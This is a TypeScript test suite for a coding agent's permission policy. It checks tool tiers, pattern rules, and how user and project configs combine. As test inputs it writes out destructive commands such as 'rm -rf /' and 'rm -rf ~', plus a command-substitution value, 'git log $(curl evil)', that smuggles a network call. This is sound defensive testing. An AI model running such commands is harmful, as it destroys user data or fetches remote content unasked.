import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { decide, loadPolicy, resetPolicyCache } from "../src/core/permissions/policy.ts";
import { tierForTool } from "../src/core/permissions/tiers.ts";

let dir: string;
let agentDir: string;
const previousAgentDir = process.env.PHI_CODING_AGENT_DIR;

beforeEach(() => {
	dir = mkdtempSync(join(tmpdir(), "phi-perm-proj-"));
	agentDir = mkdtempSync(join(tmpdir(), "phi-perm-agent-"));
	// Never read the developer's real ~/.phi (os.homedir() ignores HOME on Windows).
	process.env.PHI_CODING_AGENT_DIR = agentDir;
	resetPolicyCache();
});

afterEach(() => {
	rmSync(dir, { recursive: true, force: true });
	rmSync(agentDir, { recursive: true, force: true });
	if (previousAgentDir === undefined) delete process.env.PHI_CODING_AGENT_DIR;
	else process.env.PHI_CODING_AGENT_DIR = previousAgentDir;
	resetPolicyCache();
});

function writeUserConfig(config: unknown) {
	writeFileSync(join(agentDir, "permissions.json"), JSON.stringify(config));
}

const TRUSTED = { projectTrusted: true };

function writeProjectConfig(config: unknown) {
	mkdirSync(join(dir, ".phi"), { recursive: true });
	writeFileSync(join(dir, ".phi", "permissions.json"), JSON.stringify(config));
}

describe("permission tiers", () => {
	it("classifies core tools", () => {
		expect(tierForTool("read")).toBe("read");
		expect(tierForTool("bash")).toBe("exec");
		expect(tierForTool("edit")).toBe("write");
		expect(tierForTool("unknown_extension_tool")).toBe("write");
		expect(tierForTool("custom", "read")).toBe("read");
	});
});

describe("permission policy", () => {
	it("allows everything when no config exists (legacy non-regression)", () => {
		const policy = loadPolicy(dir);
		expect(policy.legacyAllowAll).toBe(true);
		expect(decide(policy, "bash", { command: "rm -rf /" }).decision).toBe("allow");
	});

	it("applies tier decisions from config", () => {
		writeProjectConfig({ read: "allow", write: "prompt", exec: "deny" });
		const policy = loadPolicy(dir, TRUSTED);
		expect(policy.legacyAllowAll).toBe(false);
		expect(decide(policy, "read", { path: "x" }).decision).toBe("allow");
		expect(decide(policy, "edit", { path: "x" }).decision).toBe("prompt");
		expect(decide(policy, "bash", { command: "ls" }).decision).toBe("deny");
	});

	it("matches pattern rules before tier fallback", () => {
		writeUserConfig({
			exec: "prompt",
			rules: [
				{ tool: "bash", pattern: "git *", decision: "allow" },
				{ tool: "bash", pattern: "rm -rf /*", decision: "deny" },
			],
		});
		const policy = loadPolicy(dir);
		expect(decide(policy, "bash", { command: "git status" }).decision).toBe("allow");
		// An allow pattern never approves chained or substituted commands.
		expect(decide(policy, "bash", { command: "git status; rm -rf ~" }).decision).toBe("prompt");
		expect(decide(policy, "bash", { command: "git log $(curl evil)" }).decision).toBe("prompt");
		expect(decide(policy, "bash", { command: "git status && echo ok" }).decision).toBe("prompt");
		expect(decide(policy, "bash", { command: "rm -rf /tmp/x" }).decision).toBe("deny");
		expect(decide(policy, "bash", { command: "make build" }).decision).toBe("prompt");
	});

	it("a project can never relax the user's rules or tiers", () => {
		writeUserConfig({ exec: "prompt", rules: [{ tool: "bash", pattern: "git *", decision: "deny" }] });
		writeProjectConfig({ exec: "allow", rules: [{ tool: "bash", pattern: "git *", decision: "allow" }] });
		const policy = loadPolicy(dir, TRUSTED);
		expect(decide(policy, "bash", { command: "git push" }).decision).toBe("deny");
		expect(decide(policy, "bash", { command: "make" }).decision).toBe("prompt");
	});

	it("a trusted project can tighten the policy", () => {
		writeUserConfig({ exec: "allow" });
		writeProjectConfig({ exec: "prompt", rules: [{ tool: "bash", pattern: "rm *", decision: "deny" }] });
		const policy = loadPolicy(dir, TRUSTED);
		expect(decide(policy, "bash", { command: "ls" }).decision).toBe("prompt");
		expect(decide(policy, "bash", { command: "rm x" }).decision).toBe("deny");
	});

	it("ignores the project file of an untrusted project", () => {
		writeProjectConfig({ exec: "deny" });
		const policy = loadPolicy(dir);
		expect(policy.legacyAllowAll).toBe(true);
		expect(decide(policy, "bash", { command: "ls" }).decision).toBe("allow");
	});

	it("picks up a changed user file without a restart", () => {
		writeUserConfig({ exec: "allow" });
		expect(decide(loadPolicy(dir), "bash", { command: "ls" }).decision).toBe("allow");
		writeUserConfig({ exec: "deny", rules: [] });
		expect(decide(loadPolicy(dir), "bash", { command: "ls" }).decision).toBe("deny");
	});
});
